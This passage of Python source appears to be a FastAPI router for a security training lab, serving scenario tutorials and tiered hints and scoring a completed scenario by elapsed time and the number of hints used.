    if scenario_id not in SCENARIOS:
        raise HTTPException(status_code=404, detail=f"Scenario '{scenario_id}' not found")
    tutorial = TUTORIALS.get(scenario_id)
    if not tutorial:
        raise HTTPException(status_code=404, detail=f"No tutorial for '{scenario_id}'")
    return {"ok": True, "tutorial": tutorial}


@router.get("/{scenario_id}/hints")
async def list_hints(scenario_id: str):
    """Returns all hints for a scenario (without revealing their content — just metadata)."""
    if scenario_id not in SCENARIOS:
        raise HTTPException(status_code=404, detail=f"Scenario '{scenario_id}' not found")
    hints = HINTS.get(scenario_id, [])
    return {
        "ok": True,
        "scenario_id": scenario_id,
        "hint_count": len(hints),
        "cost_per_hint_pts": 10,
        "hints_preview": [
            {"level": h["level"], "cost_pts": h["cost_pts"]}
            for h in hints
        ],
    }


@router.get("/{scenario_id}/hints/{level}")
async def get_hint(scenario_id: str, level: int):
    """
    Returns a specific hint (1, 2, or 3) for a scenario.
    Each hint deducts 10 points from the final score.
    Hints are progressive — each one is more specific than the last.
    """
    if scenario_id not in SCENARIOS:
        raise HTTPException(status_code=404, detail=f"Scenario '{scenario_id}' not found")
    hints = HINTS.get(scenario_id, [])
    if level < 1 or level > len(hints):
        raise HTTPException(
            status_code=400,
            detail=f"Hint level {level} not available. Valid levels: 1–{len(hints)}",
        )
    hint = hints[level - 1]
    return {
        "ok": True,
        "scenario_id": scenario_id,
        "hint_level": level,
        "cost_pts": hint["cost_pts"],
        "hint": hint["text"],
        "warning": f"This hint costs {hint['cost_pts']} points. Use POST /attacks/{scenario_id}/score to submit your final score.",
    }


@router.post("/{scenario_id}/score")
async def submit_score(scenario_id: str, req: ScoreRequest):
    """
    Submit a score for a completed scenario.
    Pass elapsed_seconds, hints_used (0-3), and success=true.
    Returns: final score, grade (A-F), and breakdown.
    """
    if scenario_id not in SCENARIOS:
        raise HTTPException(status_code=404, detail=f"Scenario '{scenario_id}' not found")

    result = calculate_score(
        scenario_id=scenario_id,
        elapsed_seconds=req.elapsed_seconds,
        hints_used=req.hints_used,
        success=req.success,
    )
    return {
        "ok": True,
        "scenario_id": scenario_id,
        "scenario_title": SCENARIOS[scenario_id]["title"],
        **result,
    }
